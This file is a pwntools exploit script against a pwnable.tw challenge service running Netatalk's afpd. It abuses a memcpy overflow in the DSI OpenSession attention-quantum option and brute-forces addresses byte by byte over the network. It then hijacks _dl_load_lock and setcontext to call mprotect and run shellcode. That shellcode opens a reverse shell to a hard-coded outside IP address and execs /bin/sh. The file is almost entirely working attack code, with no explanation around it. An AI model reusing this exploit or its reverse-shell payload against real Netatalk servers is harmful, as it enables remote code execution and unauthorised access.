from pwn import *

HOST = "chall.pwnable.tw"
#HOST = "localhost"
PORT =  10002
#PORT = 5566
elf = ELF('afpd'); context.arch = elf.arch
def create_header(addr): # this address will be placed in dsi->command
    command = 'b'*0x10 + addr
    quantum = ''
    quantum += '\x01' # DSIOPT_ATTNQUANT => in dsi_opensess.c, if we want to trigger memcpy, we have to set dsi->commands[i++] = 1
    quantum += chr(len(command))
    quantum += command
    '''
    uint32_t attn_quantum, datasize, server_quantum;  4 * 3 = 12
    uint16_t serverID, clientID;    2*2 = 4     => 12 + 4 = 16 = 0x10 !!
    uint8_t  *commands; /* DSI recieve buffer */ 
    '''
    payload = ''
    payload += '\x00\x04' # flag & command
    payload += '\x01\x00' # requestid
    payload += '\x00'*4
    payload +=  struct.pack(">I", len(quantum))
    payload += '\x00'*4
    payload += quantum
    return payload

def send_request(payload):
    '''
    #define DSIFUNC_CLOSE   1       /* DSICloseSession */
    #define DSIFUNC_CMD     2       /* DSICommand */
    #define DSIFUNC_STAT    3       /* DSIGetStatus */
    #define DSIFUNC_OPEN    4       /* DSIOpenSession */
    #define DSIFUNC_TICKLE  5       /* DSITickle */
    #define DSIFUNC_WRITE   6       /* DSIWrite */
    #define DSIFUNC_ATTN    8       /* DSIAttention */
    #define DSIFUNC_MAX     8       /* largest command */
    '''
    dsi_block = '\x00\x01' # DSIFUNC_CLOSE
    dsi_block += p16(0)
    dsi_block += p32(0)
    dsi_block += p32(len(payload), endianness='big')
    dsi_block += p32(0)
    return dsi_block + payload
offset_table = {'system' : 0x4f440, 'free_hook' : 0x3ed8e8, 'rtld_lock_recursive': 0xed2f60, 
                                    "_dl_load_lock" : 0xed2968, "rop" : 0xed2968+0x100, "shellcode" : 0xed2968+0x200, "mprotect" : 0x11bae0,'setcontext_53':0x52070+53} # server
idx = 2
addr_list = [['\x10'], ['\x10\xa0'], ['\x10\xa03', '\x10\xa07', '\x10\xa0;', '\x10\xa0?'], ['\x10\xa03\xad', '\x10\xa03\xb3', '\x10\xa07\xad', '\x10\xa07\xb3', '\x10\xa0;\xad', '\x10\xa0;\xb3', '\x10\xa0?\xad', '\x10\xa0?\xb3'], ['\x10\xa03\xad\xde', '\x10\xa03\xb3\xde', '\x10\xa07\xad\xde', '\x10\xa07\xb3\xde', '\x10\xa0;\xad\xde', '\x10\xa0;\xb3\xde', '\x10\xa0?\xad\xde', '\x10\xa0?\xb3\xde'], ['\x10\xa03\xad\xde\x7f', '\x10\xa03\xb3\xde\x7f', '\x10\xa07\xad\xde\x7f', '\x10\xa07\xb3\xde\x7f', '\x10\xa0;\xad\xde\x7f', '\x10\xa0;\xb3\xde\x7f', '\x10\xa0?\xad\xde\x7f', '\x10\xa0?\xb3\xde\x7f']]

while len(addr_list) <  6:
    addr_list.append(list())
    for prev in addr_list[idx-1]:
        tmp = ''
        cnt = 0
        for i in range(255,-1,-1):
            try:
                p = remote(HOST,PORT,timeout=2)
                p.send(create_header(prev + chr(i)))
                res = p.recvrepeat(1)
                if 'bbbb' in res:
                    # if cnt == 0:
                    #     tmp = prev + chr(i)
                    addr_list[idx].append(prev+chr(i))
                    cnt += 1
            except KeyboardInterrupt:
                exit()
            except:
                # if cnt >= 0x1:
                #     addr_list[idx].append(tmp)
                cnt = 0
            finally:
                p.close()
        # if cnt >= 0x1:
        #     addr_list[idx].append(tmp)
    idx += 1
    f = open("result", 'a')
    write_target = ''
    index = 1
    for o in addr_list:
        write_target += str(index) + '\n'
        for k in o:
            write_target += hex(u64(k.ljust(8,'\x00'))) + '\n'
        index += 1
    write_target += '\n\n'
    print(addr_list)
    f.write(write_target)
    f.close()
addrlist = [0xdeb344a010,0xdead44a010,0xdeb343a010,0xdead43a010,0xdeb342a010,0xdead42a010,0xdeb341a010,0xdead41a010,0xdeb340a010,0xdead40a010,
0xdeb33fa010,0xdead3fa010,0xdeb33ea010,0xdeae3ea010,0xdead3ea010,0xdeb33da010,0xdead3da010,0xdeb33ca010,0xdead3ca010,0xdeb33ba010,
0xdead3ba010,0xdeb33aa010,0xdead3aa010,0xdeb339a010,0xdead39a010,0xdeb338a010,0xdead38a010,0xdeb337a010,0xdead37a010,0xdeb336a010,
0xdead36a010,0xdeb335a010,0xdead35a010,0xdeb334a010,0xdead34a010,0xdeb333a010,0xdead33a010] #server
for i in addrlist:
    for j in range(0x100):
        command_addr = i+0x7f0000000000 - j*0x1000
        print(hex(command_addr))
        libc_base = command_addr - 0xda3010
        print(hex(libc_base))

        p = remote(HOST,PORT)

        p.send(create_header(p64(libc_base+offset_table['_dl_load_lock'])[:6]))
        #p.recv()
        argv = ''
        argv += 'a'*(0x28-len(argv))
        argv += p64(0) # r8
        argv += p64(0) # r9
        argv += p64(0) # NOTHING
        argv += p64(0) # NOTHING
        argv += p64(0) # r12
        argv += p64(0) # r13
        argv += p64(0) # r14
        argv += p64(0) # r15
        argv += p64(libc_base+0xed1000) # rdi
        argv += p64(12288) # rsi
        argv += p64(0) # rbp
        argv += p64(0) # rbx
        argv += p64(7) # rdx
        argv += p64(0) # NOTHING
        argv += p64(0) # rcx
        argv += p64(libc_base + offset_table['rop']) # rsp
        argv += p64(libc_base+offset_table['mprotect']) # rip
        payload = '' 

        argv = argv.ljust(0x100,'\x00')
        payload += argv
        payload += p64(libc_base+offset_table['shellcode']).ljust(0x100,'\x00')
        shellcode = asm(
            shellcraft.connect('35.229.207.66', 8888) +
            'push rbp; pop rdi; xor esi, esi; push SYS_dup2; pop rax; syscall;' +
            'push rbp; pop rdi; push 1; pop rsi; push SYS_dup2; pop rax; syscall;' +
            'push rbp; pop rdi; push 2; pop rsi; push SYS_dup2; pop rax; syscall;' +
            shellcraft.execve('/bin/sh')
        )
        payload += shellcode
        payload = payload.ljust(0x0005f8,'\x00') #dummy
        payload += p64(libc_base+offset_table['setcontext_53']) # function
        p.send(send_request(payload))
        p.close()






